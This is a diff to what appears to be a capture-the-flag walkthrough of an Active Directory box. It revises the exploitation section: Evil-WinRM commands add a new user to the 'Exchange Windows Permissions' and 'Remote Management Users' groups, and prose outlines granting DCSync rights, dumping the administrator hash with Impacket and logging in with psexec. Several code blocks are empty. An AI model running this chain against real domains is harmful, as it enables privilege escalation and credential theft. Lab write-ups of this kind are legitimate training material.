@@ -379,26 +379,65 @@ You can just drag/drop the zip file you downloaded or 'Upload data' menu on the 
 
 
 ### Exploitation
-To get administrator account, put `svc-alfresco` into `Exchange Windows Permissions` group.
+To get administrator account, put create a new user and put into `Exchange Windows Permissions` group and `Remote Management Users` group.
 ```shell
-*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" svc-alfresco /add /domain
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" inar1 /add
 The command completed successfully.
 
-*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group 'Exchange Windows Permissions'
-Group name     Exchange Windows Permissions
-Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted.
-
-Members
-
--------------------------------------------------------------------------------
-svc-alfresco
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net localgroup "Remote Management Users" inar1 /add
 The command completed successfully.
 
+```
+```shell
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user inar1
+User name                    inar1
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            6/9/2020 9:31:54 PM
+Password expires             7/21/2020 9:31:54 PM
+Password changeable          6/10/2020 9:31:54 PM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *Exchange Windows Perm*Domain Users
+The command completed successfully.
 
 ```
 
-Next, try [NTLM Relay](https://en.hackndo.com/ntlm-relay/).<br>
-We can use a script `ntlmrelayx.py` in [Impacket](https://github.com/SecureAuthCorp/impacket).
+Next, download [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) and upload it to the target server.
+```shell
+```
+
+According to `abuse info` on the BloodHound, give `DCSync` right for copying the DC to `svc-alfresco`.
+```shell
+
+```
+
+After that, we can use `secretdump.py` in the `Impacket` to dump the password hash for `administrator`.
+```shell
+
+```
+
+The domain admin hash can be used to login using `psexec.py`.
+```shell
+
+```
+
+`root.txt` is in the directory `C:\Users\administrator\desktop`.
 ```shell
 
 ```
